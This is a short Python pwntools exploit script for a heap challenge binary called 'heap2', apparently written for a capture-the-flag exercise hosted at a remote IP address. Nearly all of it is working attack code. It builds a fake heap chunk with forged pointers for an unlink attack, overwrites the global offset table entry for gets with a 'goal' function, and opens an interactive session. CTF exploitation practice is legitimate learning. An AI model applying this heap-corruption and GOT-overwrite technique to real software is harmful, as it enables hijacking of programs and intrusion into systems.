#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
#elf = ELF('./forging_chunk')


context.os='linux'

# need Ubuntu ???
# using tmux to run
context.terminal = ['tmux', 'splitw', '-h']

pwn_file = './heap2'
elf = ELF(pwn_file)
debug = 0
if debug == 1:
    ld_str = "./ld-2.23.so.64 --library-path ./ {}".format(pwn_file)
    print(ld_str.split())
    gdbcmd = '''
    '''
    c = process(ld_str.split(), env={'LD_PRELOAD': './libc-2.23.so'})
    gdb.attach(c, gdbcmd)
    context.log_level ='debug'
else:
    c = remote('140.110.112.77', 3126)
    context.log_level ='debug'



c.recvuntil('P = ')

p_addr = 0x601080
q_addr = 0x6010e0
pre_size = 0x100
size = 0x90
prev_inuse_false = 0x1
next_size = 0x20 + prev_inuse_false # 0x1 is pre not free
c.sendline(p64(0x20) + p64(pre_size - 0x10) + flat({0: p64(p_addr - 0x18), 8: p64(p_addr - 0x10)}, length=pre_size - 0x20) + p64(pre_size - 0x10) + p64(size) + b'b' * (size - 0x10) + p64(size) + p64(0x21) + b'a' * 0x10  + p64(0x21)+ p64(0x21))

c.sendlineafter('0x601068', p64(elf.got['gets']) * 4)
c.sendlineafter(hex(elf.got['gets']), p64(elf.symbols['goal']))


c.interactive()
c.close()

